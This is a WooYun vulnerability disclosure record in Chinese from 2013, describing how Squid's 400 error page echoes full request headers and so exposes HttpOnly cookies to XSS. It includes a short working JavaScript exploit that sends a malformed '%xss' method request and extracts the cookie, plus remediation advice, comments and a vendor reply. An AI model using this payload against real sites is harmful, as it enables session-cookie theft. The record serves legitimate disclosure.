{"id": 9923, "wybug_id": "wooyun-2013-025343", "wybug_title": "利用squid轻松获取经http only保护的cookie内容", "wybug_corp": "SQUID", "wybug_author": "nyannyannyan", "wybug_date": "2013-06-07 14:10", "wybug_open_date": "2013-09-05 14:11", "wybug_type": "设计错误/逻辑缺陷", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["设计缺陷", "不要太聪明", "不要以为永远需要"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-06-07：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2013-09-05：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： Squid cache（简称为Squid）是一个流行的自由软件（GNU通用公共许可证）的代理服务器和Web缓存服务器。Squid有广泛的用途，从作为网页服务器的前置cache服务器缓存相关请求来提高Web服务器的速度，到为一组人共享网络资源而缓存万维网，域名系统和其他网络搜索，到通过过滤流量帮助网络安全，到局域网通过代理上网。Squid主要设计用于在Linux一类系统运行。现在成为XSS的帮凶有木有= = 详细说明：  发现这个漏洞的缘起在于一次XSS...成功插入代码以后发现目标cookie是HTTP-Only的...按说，到这时候应当放弃了...但是啊...我们大学有个神奇的cache服务器叫做squid...研究了一下....发现结合squid的错误机制是可以做到bypass http-only的我们的目标错误是400: Bad Request这个错误最容易通过浏览器Ajax触发（触发方式将在下面说明）对应的错误模板文件为errors/en/ERR_INVALID_REQ让我们打开看一下....虽说习惯很不好....居然只有一行....不过重整一下还是很快找到了关键的部位\n\n这个%R是什么意思呢http://wiki.squid-cache.org/Features/CustomErrors#ERR_.2A_template_codes_for_embedding看看这里%RFull HTTP Request全部Request啊...那么意味着发出的cookie也可以方便的获取....不管是不是http-only的试一下...使用的网络是某大学的网络，squid版本为2.6/STABLE21(有点老了，但是刚刚拖了最新的3.3.5版本下来看，这个问题没有被修过)\n\n随便用一个网站，我用的是百度...这有俩httponly的cookie然后构造畸形ajax请求\n\n关键就在于那个%号这会让squid认为这是一个不合法的request method从而抛出bad request拿一下请求头\n\n然后发现httponly的SSUDB和SSUDBTSP就这样拿到了顺便吐槽一下百度，尼玛BDUSS和SSUDB是一样的内容你SSUDB是httponly的有毛意义危害及局限：1.XSS的大帮凶，httponly就这样轻轻松松bypass2.主要适用于定点打击吧...不过写一小段脚本探测一下内网环境也是可以的3.https协议下的请求因为不走cache服务器当然是拿不到的了综上所述，自评10rank最后送上一小段exploit\nfunction getCookieOrHeader(){var res= document.cookie;//Test Squidvar r;if(window.XMLHttpRequest) {r = new XMLHttpRequest();}else {try {r = new ActiveXObject(\"Msxml2.XMLHTTP\");}catch(e) {r = new ActiveXObject(\"Microsoft.XMLHTTP\");}}r.open('%xss', '/', false);r.send();if(r.status == 400 && r.responseText.search(\"squid\") != -1) {var s = r.responseText.search(/<pre>/ig) + 6;var l = r.responseText.search(/<\\/pre>/ig) - s;res = r.responseText.substr(s, l);}return res;}\n   漏洞证明：  \n\n\n\n\n\n   修复方案：  首先我是建议squid开发者避免在错误页面里面包含过于详细的请求头其次希望使用squid的团体或个人在生产环境时一定要自定义错误页面方式敏感信息外泄   版权声明：转载请注明来源 nyannyannyan@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n     2013-06-07 14:12 |    \t\t疯狗  \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:2        | 阅尽天下漏洞，心中自然无码。)\t\t \n  马克，强势关注    \n     2013-06-07 15:34 |    \t\tHxai11 \t\t\t( 普通白帽子  |\t\t\t        Rank:1137 漏洞数:218        | 于是我们奋力向前游，逆流而上的小舟，不停...)\t\t \n  表示关注！！    \n     2013-06-07 16:37 |    \t\t Jesus \t\t\t( 实习白帽子  |\t\t\t        Rank:60 漏洞数:18        | 天地不仁,以万物为刍狗！)\t\t \n  纳尼？    \n     2013-06-07 16:46 |    \t\t叶问 \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:3        | 华师 QQ695033480)\t\t \n  划时代啊    \n     2013-06-07 16:56 |    \t\tnyannyannyan \t\t\t( 路人 |\t\t\t        Rank:10 漏洞数:3        | 蒟蒻一枚)\t\t \n  表示不用那么激动= =使用还是有限制...和之前apache的洞其实并没什么不同...不过某些公司会用squid搭对外网的代理...还是有一点用处的- -    \n     2013-06-07 20:10 |    \t\tlaterain \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | Just For Fun.)\t\t \n  看过defcon上有过用squid来实现botnet的方法，大概思路就是用squid搭免费代理，然后squid插xss，别人通过代理访问就被xss，黑得妹子果照一大片。。。。虽然我看不到洞主用的什么方法，但应该还是和这个差不多吧^_^    \n     2013-06-07 20:28 |    \t\tnyannyannyan \t\t\t( 路人 |\t\t\t        Rank:10 漏洞数:3        | 蒟蒻一枚)\t\t \n  @laterain 怎么说呢....其实完全不同....如果是botnet的话...完全不用xss吧....流量什么的直接就抓下来了嘛= =    \n     2013-07-09 22:05 |    \t\tnyannyannyan \t\t\t( 路人 |\t\t\t        Rank:10 漏洞数:3        | 蒟蒻一枚)\t\t \n  @xsser往squid的mailing-list发过邮件后，刚刚收到了回复Thank you for the report. We have been aware of the problem for some time and have already fixed two aspects of it in the currently supported Squid versions.All of the recent releases should be responding to blocked methods with \"405 Method Not Allowed\" which error page does not contain any of the headers.NP: Thank you for highlighting that % code is not being permitted when it should be, that is a regular bug.Other ways of getting the \"400 Bad Request\" error page with header snippets in current releases having their HTTP security credentials elided. Headers such as Cookie are not supposed to be containing any sensitive information as they are vulnerable to cross-site delivery, replication, replay, caching. It is a systemic vulnerability to send sensitive information in such headers. We can take no responsibility for such brokenness in website code, nor is it practical to have Squid dig down into such headers and guess at what may or may not be sensitive.If you are aware of a site still using Squid-2.7 and squid-3.1, please advise them they are vulnerable to this and several other far more major security vulnerabilities.Cheers看来最新的release已经修正了一部分问题是不是算已经认领?    \n     2013-07-09 22:07 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  @nyannyannyan 算 ：） 回头整理到国际版本去 谢谢！    \n     2013-07-09 22:16 |    \t\tnyannyannyan \t\t\t( 路人 |\t\t\t        Rank:10 漏洞数:3        | 蒟蒻一枚)\t\t \n  最后对这个洞补充一句...developer的回邮表示存在着其他引发400 Bad Request的方法，而且他们认为squid是不会为此负责的....所以大家可以尝试挖一下还有没有别的方法引发400错误..    \n     2013-11-13 13:32 |    \t\tD＆G \t\t\t( 普通白帽子  |\t\t\t        Rank:523 漏洞数:103        | going)\t\t \n  @xsser wooyun国际版在哪里？？？？    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}